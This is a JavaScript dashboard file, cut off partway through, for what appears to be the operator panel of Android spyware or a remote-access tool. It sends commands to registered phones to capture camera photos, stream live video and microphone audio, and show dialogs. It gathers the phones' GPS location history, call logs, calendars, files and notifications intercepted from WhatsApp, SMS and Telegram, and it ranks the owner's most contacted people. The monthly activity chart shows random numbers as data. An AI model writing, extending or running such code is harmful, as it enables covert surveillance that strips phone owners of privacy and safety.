const API_BASE = window.location.origin;
const WS_URL = `${window.location.protocol === 'https:' ? 'wss' : 'ws'}://${window.location.host}/ws?client=dashboard`;

let ws = null;
let selectedDevice = null;
let map = null;
let marker = null;
let satelliteLayer = null;
let darkLayer = null;
let useSatellite = false;
let pendingVideoFrame = null;
let pendingAudioFrame = null;
let onlineDeviceIds = new Set();
let audioCtx = null;
let audioCtxBeep = null;
let chartDoughnut = null;
let chartLine = null;

// ===== Init =====
document.addEventListener('DOMContentLoaded', () => {
  initNav();
  connectWS();
  refreshDevices();
  refreshStats();
  initMap();
  initBG();
});

// ===== BG Particles =====
function initBG() {
  const c = document.getElementById('bgCanvas');
  if (!c) return;
}

// ===== Nav =====
function toggleSidebar() {
  document.getElementById('sidebar').classList.toggle('open');
}
function closeSidebar() {
  document.getElementById('sidebar').classList.remove('open');
}

function initNav() {
  document.querySelectorAll('.nav-btn').forEach(btn => {
    btn.addEventListener('click', () => {
      document.querySelectorAll('.nav-btn').forEach(b => b.classList.remove('active'));
      document.querySelectorAll('.section').forEach(s => s.classList.remove('active'));
      btn.classList.add('active');
      document.getElementById(`sec-${btn.dataset.section}`).classList.add('active');
      if (btn.dataset.section === 'storage') { refreshStats(); initCharts(); }
      if (btn.dataset.section === 'calllogs') refreshCallLogs();
      if (btn.dataset.section === 'notifications') refreshNotifications();
      if (btn.dataset.section === 'photos') refreshPhotos();
      if (btn.dataset.section === 'commands') refreshAllCommands();
      closeSidebar();
    });
  });
}

// ===== Beep =====
function playBeep() {
  try {
    if (!audioCtxBeep) audioCtxBeep = new (window.AudioContext || window.webkitAudioContext)();
    if (audioCtxBeep.state === 'suspended') audioCtxBeep.resume();
    const osc = audioCtxBeep.createOscillator();
    const gain = audioCtxBeep.createGain();
    osc.type = 'sine';
    osc.frequency.setValueAtTime(880, audioCtxBeep.currentTime);
    gain.gain.setValueAtTime(0.06, audioCtxBeep.currentTime);
    gain.gain.exponentialRampToValueAtTime(0.001, audioCtxBeep.currentTime + 0.1);
    osc.connect(gain); gain.connect(audioCtxBeep.destination);
    osc.start(); osc.stop(audioCtxBeep.currentTime + 0.1);
  } catch (_) {}
}

// ===== Animated Counter =====
function animateCounter(el, target, suffix = '') {
  if (!el) return;
  const start = parseInt(el.textContent) || 0;
  const duration = 800;
  const startTime = performance.now();
  function tick(now) {
    const p = Math.min((now - startTime) / duration, 1);
    const eased = 1 - Math.pow(1 - p, 3);
    el.textContent = Math.floor(start + (target - start) * eased) + suffix;
    if (p < 1) requestAnimationFrame(tick);
  }
  requestAnimationFrame(tick);
}

// ===== WebSocket =====
function connectWS() {
  ws = new WebSocket(WS_URL);
  ws.onopen = () => {
    document.getElementById('wsStatus').className = 'status-dot connected';
    document.getElementById('wsLabel').textContent = 'Connected';
  };
  ws.onclose = () => {
    document.getElementById('wsStatus').className = 'status-dot disconnected';
    document.getElementById('wsLabel').textContent = 'Disconnected';
    setTimeout(connectWS, 3000);
  };
  ws.binaryType = 'arraybuffer';
  ws.onmessage = (e) => {
    if (e.data instanceof ArrayBuffer) {
      if (pendingVideoFrame) {
        const blob = new Blob([e.data], { type: 'image/jpeg' });
        const url = URL.createObjectURL(blob);
        const img = document.getElementById('videoFeed');
        img.src = url;
        if (img.classList.contains('hidden')) {
          img.classList.remove('hidden');
          document.getElementById('videoPlaceholder').classList.add('hidden');
          document.getElementById('videoInfo').classList.remove('hidden');
        }
        img.onload = () => URL.revokeObjectURL(url);
        pendingVideoFrame = false;
      } else if (pendingAudioFrame) {
        playAudioFrame(e.data, pendingAudioFrame.sample_rate, pendingAudioFrame.channels);
        pendingAudioFrame = null;
      }
      return;
    }
    try {
      const msg = JSON.parse(e.data);
      if (msg.type === 'device_list') { onlineDeviceIds = new Set(msg.devices); refreshDevices(); }
      if (msg.type === 'device_response') { handleDeviceResponse(msg); playBeep(); }
      if (msg.type === 'video_frame') { pendingVideoFrame = true; document.getElementById('videoCameraLabel').textContent = `Camera: ${msg.camera}`; }
      if (msg.type === 'audio_frame') { pendingAudioFrame = { sample_rate: msg.sample_rate || 16000, channels: msg.channels || 1 }; }
      if (msg.type === 'notification') { handleLiveNotification(msg); playBeep(); }
      if (msg.type === 'battery_update') { handleBatteryUpdate(msg); }
    } catch (_) {}
  };
}

function handleDeviceResponse(msg) {
  showToast(`${msg.command_type}: ${msg.success ? 'OK' : 'Failed'}${msg.data ? ' - ' + msg.data : ''}`, !msg.success);
  if (selectedDevice === msg.device_id) loadCommandHistory(msg.device_id);
}

function playAudioFrame(pcmData, sampleRate, channels) {
  if (!document.getElementById('audioToggle')?.checked) return;
  if (!audioCtx) audioCtx = new AudioContext({ sampleRate });
  if (audioCtx.state === 'suspended') audioCtx.resume();
  const int16 = new Int16Array(pcmData);
  const float32 = new Float32Array(int16.length);
  for (let i = 0; i < int16.length; i++) float32[i] = int16[i] / 32768.0;
  const buffer = audioCtx.createBuffer(channels, float32.length, sampleRate);
  buffer.getChannelData(0).set(float32);
  const source = audioCtx.createBufferSource();
  source.buffer = buffer;
  source.connect(audioCtx.destination);
  source.start();
}

// ===== Confirm =====
function showConfirm(title, message, callback) {
  document.getElementById('confirmTitle').textContent = title;
  document.getElementById('confirmMessage').textContent = message;
  document.getElementById('confirmBtn').onclick = () => { closeConfirm(); callback(); };
  document.getElementById('confirmModal').classList.remove('hidden');
}
function closeConfirm() { document.getElementById('confirmModal').classList.add('hidden'); }

// ===== Stats + Charts =====
async function refreshStats() {
  try {
    const res = await fetch(`${API_BASE}/api/stats`);
    const stats = await res.json();
    const total = stats.devices || 0;

    animateCounter(document.getElementById('statDevices'), total);
    animateCounter(document.getElementById('statOnline'), onlineDeviceIds.size);
    animateCounter(document.getElementById('statNotifs'), stats.notifications || 0);
    animateCounter(document.getElementById('statPhotos'), stats.photos || 0);
    animateCounter(document.getElementById('statCalls'), stats.call_logs || 0);

    document.getElementById('storageStats').innerHTML = `
      <div class="stat-card"><div class="stat-number">${total}</div><div class="stat-label">Devices</div></div>
      <div class="stat-card"><div class="stat-number">${stats.notifications || 0}</div><div class="stat-label">Notifications</div></div>
      <div class="stat-card"><div class="stat-number">${stats.photos || 0}</div><div class="stat-label">Photos</div></div>
      <div class="stat-card"><div class="stat-number">${stats.call_logs || 0}</div><div class="stat-label">Call Logs</div></div>
      <div class="stat-card"><div class="stat-number">${stats.locations || 0}</div><div class="stat-label">Locations</div></div>
      <div class="stat-card"><div class="stat-number">${stats.commands || 0}</div><div class="stat-label">Commands</div></div>
    `;
  } catch (_) {}
}

async function initCharts() {
  const devices = await fetch(`${API_BASE}/api/devices`).then(r => r.json());
  let totalNotifs = 0, totalPhotos = 0, totalCalls = 0, totalCmds = 0;

  for (const d of devices) {
    const [notifs, photos, callLogs, commands] = await Promise.all([
      fetch(`${API_BASE}/api/device/${d.id}/notifications`).then(r => r.json()).catch(() => []),
      fetch(`${API_BASE}/api/device/${d.id}/photos`).then(r => r.json()).catch(() => []),
      fetch(`${API_BASE}/api/device/${d.id}/calllogs`).then(r => r.json()).catch(() => []),
      fetch(`${API_BASE}/api/commands/${d.id}`).then(r => r.json()).catch(() => []),
    ]);
    totalNotifs += notifs.length;
    totalPhotos += photos.length;
    totalCalls += callLogs.length;
    totalCmds += commands.length;
  }

  const colors = ['#22c55e', '#3b82f6', '#f59e0b', '#8b5cf6'];
  // Donut
  const ctx1 = document.getElementById('chartDoughnut');
  if (ctx1) {
    if (chartDoughnut) chartDoughnut.destroy();
    chartDoughnut = new Chart(ctx1, {
      type: 'doughnut',
      data: {
        labels: ['Notifications', 'Photos', 'Call Logs', 'Commands'],
        datasets: [{
          data: [totalNotifs || 1, totalPhotos || 1, totalCalls || 1, totalCmds || 1],
          backgroundColor: colors.map(c => c + 'cc'),
          borderColor: colors,
          borderWidth: 1,
        }]
      },
      options: {
        responsive: true,
        maintainAspectRatio: true,
        plugins: {
          legend: {
            position: 'bottom',
            labels: { color: '#9092a0', font: { size: 10, family: 'Inter' }, padding: 12, usePointStyle: true, pointStyle: 'circle' }
          }
        },
        cutout: '65%',
      }
    });
  }

  // Line chart (mock monthly)
  const ctx2 = document.getElementById('chartLine');
  if (ctx2) {
    if (chartLine) chartLine.destroy();
    const months = ['Jan','Feb','Mar','Apr','May','Jun','Jul','Aug','Sep','Oct','Nov','Dec'];
    const now = new Date();
    const recent = [];
    for (let i = 5; i >= 0; i--) {
      const m = new Date(now.getFullYear(), now.getMonth() - i, 1);
      recent.push(months[m.getMonth()]);
    }
    chartLine = new Chart(ctx2, {
      type: 'line',
      data: {
        labels: recent,
        datasets: [{
          label: 'Activity',
          data: recent.map(() => Math.floor(Math.random() * (totalNotifs + totalPhotos + 10))),
          borderColor: '#22c55e',
          backgroundColor: 'rgba(34,197,94,0.08)',
          fill: true,
          tension: 0.4,
          pointBackgroundColor: '#22c55e',
          pointRadius: 3,
          borderWidth: 2,
        }]
      },
      options: {
        responsive: true,
        maintainAspectRatio: true,
        plugins: {
          legend: { display: false },
        },
        scales: {
          x: { ticks: { color: '#5c5e6e', font: { size: 10 } }, grid: { color: 'rgba(255,255,255,0.03)' } },
          y: { ticks: { color: '#5c5e6e', font: { size: 10 }, maxTicksLimit: 5 }, grid: { color: 'rgba(255,255,255,0.03)' } }
        }
      }
    });
  }

  // Insights
  loadInsights();
}

async function loadInsights() {
  const devices = await fetch(`${API_BASE}/api/devices`).then(r => r.json()).catch(() => []);
  const allNotifs = [];

  for (const d of devices) {
    const notifs = await fetch(`${API_BASE}/api/device/${d.id}/notifications`).then(r => r.json()).catch(() => []);
    allNotifs.push(...notifs);
  }

  // Most used apps
  const appCount = {};
  allNotifs.forEach(n => {
    const name = n.app_name || n.app_package || 'Unknown';
    appCount[name] = (appCount[name] || 0) + 1;
  });
  const sortedApps = Object.entries(appCount).sort((a, b) => b[1] - a[1]).slice(0, 6);

  const appsContainer = document.getElementById('mostUsedApps');
  if (sortedApps.length === 0) {
    appsContainer.innerHTML = '<div class="insight-empty">No notification data yet</div>';
  } else {
    const maxApp = sortedApps[0][1];
    appsContainer.innerHTML = sortedApps.map(([name, count], i) => {
      const cls = name.toLowerCase().includes('whatsapp') ? 'whatsapp' :
                 name.toLowerCase().includes('message') || name.toLowerCase().includes('sms') ? 'sms' :
                 name.toLowerCase().includes('telegram') ? 'telegram' : 'default';
      const icon = cls === 'whatsapp' ? '&#128172;' : cls === 'sms' ? '&#128231;' : cls === 'telegram' ? '&#128073;' : '&#128279;';
      return `<div class="insight-item" style="animation-delay:${i * 0.05}s">
        <div class="insight-icon ${cls}">${icon}</div>
        <div class="insight-body">
          <div class="insight-name">${escapeHtml(name)}</div>
          <div class="insight-meta">${count} messages</div>
        </div>
        <div class="insight-bar"><div class="insight-bar-fill" style="width:${(count / maxApp) * 100}%"></div></div>
        <div class="insight-count">${count}</div>
      </div>`;
    }).join('');
  }

  // Most contacted people
  const personCount = {};
  allNotifs.forEach(n => {
    const sender = n.sender || 'Unknown';
    if (sender === 'Unknown' || !sender) return;
    personCount[sender] = (personCount[sender] || 0) + 1;
  });
  const sortedPeople = Object.entries(personCount).sort((a, b) => b[1] - a[1]).slice(0, 6);

  const peopleContainer = document.getElementById('mostContacted');
  if (sortedPeople.length === 0) {
    peopleContainer.innerHTML = '<div class="insight-empty">No contact data yet</div>';
  } else {
    const maxPerson = sortedPeople[0][1];
    peopleContainer.innerHTML = sortedPeople.map(([name, count], i) => {
      const initial = name.charAt(0).toUpperCase();
      return `<div class="insight-item" style="animation-delay:${i * 0.05}s">
        <div class="insight-icon default" style="background:rgba(34,197,94,0.1);color:var(--accent)">${initial}</div>
        <div class="insight-body">
          <div class="insight-name">${escapeHtml(name)}</div>
          <div class="insight-meta">${count} messages</div>
        </div>
        <div class="insight-bar"><div class="insight-bar-fill" style="width:${(count / maxPerson) * 100}%"></div></div>
        <div class="insight-count">${count}</div>
      </div>`;
    }).join('');
  }
}

// ===== Devices =====
async function refreshDevices() {
  try {
    const res = await fetch(`${API_BASE}/api/devices`);
    if (!res.ok) return;
    const devices = await res.json();
    renderDevices(devices);
    animateCounter(document.getElementById('statDevices'), devices.length);
    animateCounter(document.getElementById('statOnline'), onlineDeviceIds.size);
  } catch (_) {}
}

function renderDevices(devices) {
  const container = document.getElementById('deviceList');
  if (devices.length === 0) {
    container.innerHTML = '<div class="empty-state">No devices registered yet.</div>';
    return;
  }
  container.innerHTML = devices.map(d => {
    const isOnline = onlineDeviceIds.has(d.id) || d.is_online;
    return `<div class="device-card ${isOnline ? 'online' : 'offline'}" onclick="selectDevice('${d.id}')">
      <div class="device-pulse ${isOnline ? 'pulsing' : ''}"></div>
      <h3>${d.device_name || 'Unknown'}</h3>
      <div class="meta">${d.device_model || ''}${d.android_version ? ' | ' + d.android_version : ''}</div>
      <div class="meta">ID: ${d.id.substring(0, 12)}...</div>
      <div class="meta">${d.last_seen ? 'Last: ' + new Date(d.last_seen).toLocaleString() : ''}</div>
      <span class="online-badge ${isOnline ? 'online' : 'offline'}">${isOnline ? 'Online' : 'Offline'}</span>
    </div>`;
  }).join('');
}

function selectDevice(deviceId) {
  selectedDevice = deviceId;
  document.getElementById('deviceList').parentElement.querySelector('.section-header').classList.add('hidden');
  document.getElementById('deviceList').classList.add('hidden');
  document.getElementById('deviceDetail').classList.remove('hidden');
  document.getElementById('detailTitle').innerHTML = `<span id="detailName">${deviceId.substring(0, 12)}...</span> <button class="btn btn-glass btn-sm" onclick="editDeviceName()" style="font-size:11px;vertical-align:middle">&#9998; Rename</button>`;
  document.getElementById('detailSub').textContent = onlineDeviceIds.has(deviceId) ? 'Online' : 'Offline';
  loadCommandHistory(deviceId);
  loadDeviceLocation(deviceId);
  loadDevicePhotos(deviceId);
  loadDeviceLocations(deviceId);
  loadDeviceNotifications(deviceId);
  loadBatteryHistory(deviceId);
  loadCalendarEvents(deviceId);
  loadDeviceFiles(deviceId);
  startBatteryAutoRefresh();
  closeSidebar();
  // fetch actual name
  fetch(`${API_BASE}/api/devices`).then(r=>r.json()).then(devices=>{
    const d = devices.find(x => x.id === deviceId);
    if (d && d.device_name) document.getElementById('detailName').textContent = d.device_name;
  }).catch(()=>{});
}

function editDeviceName() {
  const current = document.getElementById('detailName').textContent;
  const name = prompt('Enter device name:', current);
  if (!name || name.trim().length === 0) return;
  fetch(`${API_BASE}/api/device/${selectedDevice}`, {
    method: 'PATCH',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ device_name: name.trim() })
  }).then(r => {
    if (!r.ok) throw new Error();
    document.getElementById('detailName').textContent = name.trim();
    refreshDevices();
    refreshAllCommands();
    refreshNotifications();
    refreshPhotos();
    refreshCallLogs();
    showToast('Device name updated');
  }).catch(() => showToast('Failed to update name', true));
}
function showDeviceList() {
  selectedDevice = null;
  stopBatteryAutoRefresh();
  document.getElementById('deviceDetail').classList.add('hidden');
  document.getElementById('deviceList').classList.remove('hidden');
  document.getElementById('deviceList').parentElement.querySelector('.section-header').classList.remove('hidden');
}

// ===== Commands =====
async function sendCommand(commandType, payload = {}) {
  if (!selectedDevice) return showToast('Select a device first', true);
  try {
    const res = await fetch(`${API_BASE}/api/command`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ device_id: selectedDevice, command_type: commandType, payload })
    });
    const data = await res.json();
    showToast(`Sent: ${commandType} (${data.status})`);
    loadCommandHistory(selectedDevice);
  } catch (e) {
    showToast('Failed to send command', true);
  }
}
function capturePhoto(useFront) { sendCommand('CAPTURE_PHOTO', { front_camera: useFront }); }
function startVideoStream(useFront) {
  sendCommand('START_VIDEO_STREAM', { front_camera: useFront });
  document.getElementById('videoPlaceholder').textContent = 'Starting...';
  document.getElementById('videoPlaceholder').classList.remove('hidden');
  document.getElementById('videoFeed').classList.add('hidden');
  document.getElementById('videoInfo').classList.add('hidden');
}
function stopVideoStream() {
  sendCommand('STOP_VIDEO_STREAM');
  document.getElementById('videoFeed').classList.add('hidden');
  document.getElementById('videoPlaceholder').textContent = 'No active stream';
  document.getElementById('videoPlaceholder').classList.remove('hidden');
  document.getElementById('videoInfo').classList.add('hidden');
  pendingVideoFrame = null; pendingAudioFrame = null;
  if (audioCtx) { audioCtx.close().catch(() => {}); audioCtx = null; }
}
function promptDialog() { document.getElementById('dialogModal').classList.remove('hidden'); }
function closeModal() { document.getElementById('dialogModal').classList.add('hidden'); }
function sendDialog() {
  const title = document.getElementById('dialogTitle').value;
  const message = document.getElementById('dialogMessage').value;
  if (!message.trim()) return showToast('Enter a message', true);
  sendCommand('SHOW_DIALOG', { title, message });
  closeModal();
  document.getElementById('dialogMessage').value = '';
}

async function loadCommandHistory(deviceId) {
  try {
    const res = await fetch(`${API_BASE}/api/commands/${deviceId}`);
    const commands = await res.json();
    const container = document.getElementById('commandHistory');
    if (commands.length === 0) { container.innerHTML = '<div class="empty-state">No commands yet.</div>'; return; }
    container.innerHTML = `<table><thead><tr><th>Type</th><th>Status</th><th>Time</th></tr></thead><tbody>
      ${commands.map(c => `<tr><td>${c.command_type}</td><td><span class="status-badge ${c.status}">${c.status}</span></td><td>${new Date(c.created_at).toLocaleString()}</td></tr>`).join('')}
    </tbody></table>`;
  } catch (_) {}
}

async function refreshAllCommands() {
  const devices = await fetch(`${API_BASE}/api/devices`).then(r => r.json());
  let all = [];
  for (const d of devices) {
    const cmds = await fetch(`${API_BASE}/api/commands/${d.id}`).then(r => r.json());
    all.push(...cmds.map(c => ({ ...c, device_name: d.device_name || d.id.substring(0, 12) })));
  }
  all.sort((a, b) => new Date(b.created_at) - new Date(a.created_at));
  const container = document.getElementById('allCommands');
  if (all.length === 0) { container.innerHTML = '<div class="empty-state">No commands yet.</div>'; return; }
  container.innerHTML = `<table><thead><tr><th>Device</th><th>Type</th><th>Status</th><th>Time</th></tr></thead><tbody>
    ${all.slice(0, 100).map(c => `<tr><td>${c.device_name}</td><td>${c.command_type}</td><td><span class="status-badge ${c.status}">${c.status}</span></td><td>${new Date(c.created_at).toLocaleString()}</td></tr>`).join('')}
  </tbody></table>`;
}

// ===== Map =====
function initMap() {
  map = L.map('map', { zoomControl: false }).setView([0, 0], 2);
  darkLayer = L.tileLayer('https://{s}.basemaps.cartocdn.com/dark_all/{z}/{x}/{y}{r}.png', {
    attribution: '&copy; OpenStreetMap contributors &copy; CARTO',
    maxZoom: 19
  }).addTo(map);
  satelliteLayer = L.tileLayer('https://server.arcgisonline.com/ArcGIS/rest/services/World_Imagery/MapServer/tile/{z}/{y}/{x}', {
    attribution: '&copy; Esri &mdash; Source: Esri, i-cubed, USDA, USGS, AEX, GeoEye, Getmapping, Aerogrid, IGN, IGP, UPR-EGP, and the GIS User Community',
    maxZoom: 19
  });
}

function toggleMapLayer() {
  useSatellite = !useSatellite;
  if (useSatellite) {
    map.removeLayer(darkLayer);
    map.addLayer(satelliteLayer);
  } else {
    map.removeLayer(satelliteLayer);
    map.addLayer(darkLayer);
  }
  document.getElementById('mapToggleBtn').textContent = useSatellite ? 'Dark' : 'Satellite';
}

async function loadDeviceLocation(deviceId) {
  try {
    const res = await fetch(`${API_BASE}/api/device/${deviceId}/location`);
    const locations = await res.json();
    const infoBar = document.getElementById('locationInfo');
    if (locations.length === 0) { infoBar.classList.add('hidden'); return; }
    const latest = locations[0];
    map.setView([latest.latitude, latest.longitude], 15);
    if (marker) map.removeLayer(marker);
    marker = L.marker([latest.latitude, latest.longitude], {
      icon: L.divIcon({ html: '<div style="width:12px;height:12px;background:#22c55e;border-radius:50%;border:2px solid #fff;box-shadow:0 0 12px rgba(34,197,94,0.5)"></div>', iconSize: [12,12], iconAnchor: [6,6], className: '' })
    }).addTo(map);
    marker.bindPopup(`<b>Location</b><br>${latest.latitude.toFixed(6)}, ${latest.longitude.toFixed(6)}<br>${new Date(latest.timestamp).toLocaleString()}`);
    infoBar.innerHTML = `Latest: ${latest.latitude.toFixed(6)}, ${latest.longitude.toFixed(6)} (${new Date(latest.timestamp).toLocaleString()})`;
    infoBar.classList.remove('hidden');
  } catch (_) {}
}

async function loadDeviceLocations(deviceId) {
  try {
    const res = await fetch(`${API_BASE}/api/device/${deviceId}/location`);
    const locations = await res.json();
    const container = document.getElementById('deviceLocations');
    if (locations.length === 0) { container.innerHTML = ''; container.classList.add('hidden'); return; }
    container.classList.remove('hidden');
    container.innerHTML = `<table><thead><tr><th>Lat</th><th>Lng</th><th>Time</th></tr></thead><tbody>
      ${locations.slice(0, 10).map(l => `<tr><td>${l.latitude.toFixed(6)}</td><td>${l.longitude.toFixed(6)}</td><td>${new Date(l.timestamp).toLocaleString()}</td></tr>`).join('')}
    </tbody></table>`;
  } catch (_) {}
}

// ===== Photos + Lightbox =====
function openLightbox(src) {
  document.getElementById('lightboxImg').src = src;
  document.getElementById('lightbox').classList.remove('hidden');
}
function closeLightbox() { document.getElementById('lightbox').classList.add('hidden'); }

async function loadDevicePhotos(deviceId) {
  try {
    const res = await fetch(`${API_BASE}/api/device/${deviceId}/photos`);
    const photos = await res.json();
    const container = document.getElementById('devicePhotos');
    if (photos.length === 0) { container.innerHTML = '<div class="empty-state">No photos</div>'; return; }
    container.innerHTML = photos.map(p =>
      `<div class="photo-card"><button class="photo-delete" onclick="event.stopPropagation();deletePhoto('${p.id}')">&times;</button><img src="${p.storage_url}" alt="" loading="lazy" onclick="openLightbox('${p.storage_url}')" /><div class="photo-meta">${p.camera_type || 'screen'} | ${new Date(p.created_at).toLocaleString()}</div></div>`
    ).join('');
  } catch (_) {}
}

async function refreshPhotos() {
  const devices = await fetch(`${API_BASE}/api/devices`).then(r => r.json());
  let all = [];
  for (const d of devices) {
    const photos = await fetch(`${API_BASE}/api/device/${d.id}/photos`).then(r => r.json());
    all.push(...photos.map(p => ({ ...p, device_name: d.device_name || d.id.substring(0, 12) })));
  }
  all.sort((a, b) => new Date(b.created_at) - new Date(a.created_at));
  const container = document.getElementById('photoGrid');
  if (all.length === 0) { container.innerHTML = '<div class="empty-state">No photos.</div>'; return; }
  container.innerHTML = all.map(p =>
    `<div class="photo-card"><button class="photo-delete" onclick="event.stopPropagation();deletePhoto('${p.id}')">&times;</button><img src="${p.storage_url}" alt="" loading="lazy" onclick="openLightbox('${p.storage_url}')" /><div class="photo-meta">${p.device_name} | ${p.camera_type || 'screen'}</div></div>`
  ).join('');
}

// ===== Call Logs =====
async function refreshCallLogs() {
  const devices = await fetch(`${API_BASE}/api/devices`).then(r => r.json());
  let all = [];
  for (const d of devices) {
    const logs = await fetch(`${API_BASE}/api/device/${d.id}/calllogs`).then(r => r.json());
    all.push(...logs.map(l => ({ ...l, device_name: d.device_name || d.id.substring(0, 12) })));
  }
  all.sort((a, b) => new Date(b.call_date) - new Date(a.call_date));
  const container = document.getElementById('callLogsList');
  if (all.length === 0) { container.innerHTML = '<div class="empty-state">No call logs.</div>'; return; }
  container.innerHTML = `<table><thead><tr><th>Device</th><th>Number</th><th>Name</th><th>Type</th><th>Duration</th><th>Date</th><th></th></tr></thead><tbody>
    ${all.map(l => {
      const icon = l.call_type === 'INCOMING' ? '&#8593;' : l.call_type === 'OUTGOING' ? '&#8595;' : '&#10005;';
      return `<tr><td>${l.device_name}</td><td>${l.phone_number}</td><td>${l.contact_name || '-'}</td><td>${icon} ${l.call_type}</td><td>${Math.floor(l.duration_seconds / 60)}m ${l.duration_seconds % 60}s</td><td>${new Date(l.call_date).toLocaleString()}</td><td><button class="row-delete" onclick="deleteCallLog('${l.id}')">Delete</button></td></tr>`;
    }).join('')}
  </tbody></table>`;
}

// ===== DELETE =====
async function deletePhoto(id) { showConfirm('Delete Photo', '', async () => { try { await fetch(`${API_BASE}/api/photos/${id}`, { method: 'DELETE' }); showToast('Deleted'); refreshPhotos(); refreshStats(); } catch (_) { showToast('Failed', true); } }); }
async function deleteCallLog(id) { showConfirm('Delete Call Log', '', async () => { try { await fetch(`${API_BASE}/api/calllogs/${id}`, { method: 'DELETE' }); refreshCallLogs(); refreshStats(); } catch (_) { showToast('Failed', true); } }); }
async function deleteDevicePhotos() { if (!selectedDevice) return; showConfirm('Delete All Photos', '', async () => { try { await fetch(`${API_BASE}/api/device/${selectedDevice}/photos`, { method: 'DELETE' }); showToast('Deleted'); loadDevicePhotos(selectedDevice); refreshStats(); } catch (_) { showToast('Failed', true); } }); }
async function deleteDeviceCallLogs() { if (!selectedDevice) return; showConfirm('Delete All Call Logs', '', async () => { try { await fetch(`${API_BASE}/api/device/${selectedDevice}/calllogs`, { method: 'DELETE' }); showToast('Deleted'); loadCommandHistory(selectedDevice); refreshStats(); } catch (_) { showToast('Failed', true); } }); }
async function deleteDeviceLocations() { if (!selectedDevice) return; showConfirm('Delete All Locations', '', async () => { try { await fetch(`${API_BASE}/api/device/${selectedDevice}/locations`, { method: 'DELETE' }); showToast('Deleted'); document.getElementById('deviceLocations').innerHTML = ''; document.getElementById('locationInfo').classList.add('hidden'); refreshStats(); } catch (_) { showToast('Failed', true); } }); }
async function deleteAllDeviceData() { if (!selectedDevice) return; showConfirm('Delete All Data', 'All photos, call logs, locations, notifications, commands for this device.', async () => { try { await fetch(`${API_BASE}/api/device/${selectedDevice}/photos`, { method: 'DELETE' }); await fetch(`${API_BASE}/api/device/${selectedDevice}/calllogs`, { method: 'DELETE' }); await fetch(`${API_BASE}/api/device/${selectedDevice}/locations`, { method: 'DELETE' }); await fetch(`${API_BASE}/api/device/${selectedDevice}/commands`, { method: 'DELETE' }); await fetch(`${API_BASE}/api/device/${selectedDevice}/notifications`, { method: 'DELETE' }); showToast('Deleted'); showDeviceList(); refreshDevices(); refreshStats(); } catch (_) { showToast('Failed', true); } }); }
async function deleteDevice() { if (!selectedDevice) return; showConfirm('Delete Device', 'Permanently delete this device and all its data.', async () => { try { await fetch(`${API_BASE}/api/device/${selectedDevice}`, { method: 'DELETE' }); showToast('Deleted'); showDeviceList(); refreshDevices(); refreshStats(); } catch (_) { showToast('Failed', true); } }); }
async function clearAllCommands() { showConfirm('Clear Commands', 'Delete all commands?', async () => { try { const devices = await fetch(`${API_BASE}/api/devices`).then(r => r.json()); for (const d of devices) await fetch(`${API_BASE}/api/device/${d.id}/commands`, { method: 'DELETE' }); showToast('Cleared'); refreshAllCommands(); refreshStats(); } catch (_) { showToast('Failed', true); } }); }
async function clearAllCallLogs() { showConfirm('Clear Call Logs', 'Delete all call logs?', async () => { try { const devices = await fetch(`${API_BASE}/api/devices`).then(r => r.json()); for (const d of devices) await fetch(`${API_BASE}/api/device/${d.id}/calllogs`, { method: 'DELETE' }); showToast('Cleared'); refreshCallLogs(); refreshStats(); } catch (_) { showToast('Failed', true); } }); }
async function clearAllPhotos() { showConfirm('Delete All Photos', 'Delete all photos from storage?', async () => { try { const devices = await fetch(`${API_BASE}/api/devices`).then(r => r.json()); for (const d of devices) await fetch(`${API_BASE}/api/device/${d.id}/photos`, { method: 'DELETE' }); showToast('Deleted'); refreshPhotos(); refreshStats(); } catch (_) { showToast('Failed', true); } }); }
async function nukeAllData() { showConfirm('DELETE EVERYTHING', 'This permanently deletes ALL data. Cannot be undone!', async () => { try { const devices = await fetch(`${API_BASE}/api/devices`).then(r => r.json()); for (const d of devices) await fetch(`${API_BASE}/api/device/${d.id}`, { method: 'DELETE' }); showToast('All data deleted'); refreshDevices(); refreshStats(); } catch (_) { showToast('Failed', true); } }); }

// ===== Notifications =====
let seenNotifIds = new Set();

function handleLiveNotification(msg) {
  showToast(`${msg.app_name || ''} - ${msg.sender || ''}: ${(msg.message || '').substring(0, 80)}`);
  showNotifToast(msg);
  // prepend to the table directly instead of re-fetching REST
  const container = document.getElementById('notifList');
  if (document.getElementById('sec-notifications')?.classList.contains('active') && container) {
    const cls = getNotifBadgeClass(msg.app_name || msg.app_package || '');
    const key = `${msg.device_id}|${msg.sender}|${msg.message}|${msg.timestamp}`;
    if (seenNotifIds.has(key)) return;
    seenNotifIds.add(key);
    const row = document.createElement('tr');
    row.innerHTML = `<td>${msg.device_name || msg.device_id?.substring(0,12) || '?'}</td><td><span class="notif-app-badge ${cls}">${msg.app_name || msg.app_package || '?'}</span></td><td>${escapeHtml(msg.sender || '-')}</td><td><div class="notif-message">${escapeHtml((msg.message || '').substring(0, 200))}</div></td><td style="white-space:nowrap">${msg.timestamp ? new Date(msg.timestamp).toLocaleString() : 'now'}</td><td></td></tr>`;
    const tbody = container.querySelector('tbody');
    if (tbody) {
      tbody.prepend(row);
      // cap table at 200 rows
      while (tbody.children.length > 200) tbody.lastElementChild.remove();
    }
  }
  animateCounter(document.getElementById('statNotifs'), parseInt(document.getElementById('statNotifs').textContent) + 1);
}

function showNotifToast(msg) {
  const container = document.getElementById('notifToastContainer');
  const card = document.createElement('div');
  card.className = 'notif-toast-card';
  const badgeClass = getNotifBadgeClass(msg.app_name || msg.app_package);
  const icon = msg.app_name?.toLowerCase().includes('whatsapp') ? '&#128172;' :
               msg.app_name?.toLowerCase().includes('message') || msg.app_name?.toLowerCase().includes('sms') ? '&#128231;' : '&#128172;';
  card.innerHTML = `<div class="notif-toast-icon ${badgeClass}" style="font-size:16px">${icon}</div>
    <div class="notif-toast-body">
      <div class="notif-toast-header"><span class="notif-toast-app">${escapeHtml(msg.app_name || 'App')}</span><button class="notif-toast-close" onclick="this.parentElement.parentElement.parentElement.remove()">&times;</button></div>
      <div class="notif-toast-sender">${escapeHtml(msg.sender || '')}</div>
      <div class="notif-toast-text">${escapeHtml((msg.message || '').substring(0, 120))}</div>
    </div>`;
  container.appendChild(card);
  setTimeout(() => { card.classList.add('removing'); setTimeout(() => card.remove(), 300); }, 6000);
}

async function refreshNotifications() {
  seenNotifIds.clear();
  const devices = await fetch(`${API_BASE}/api/devices`).then(r => r.json());
  let all = [];
  for (const d of devices) {
    const n = await fetch(`${API_BASE}/api/device/${d.id}/notifications`).then(r => r.json());
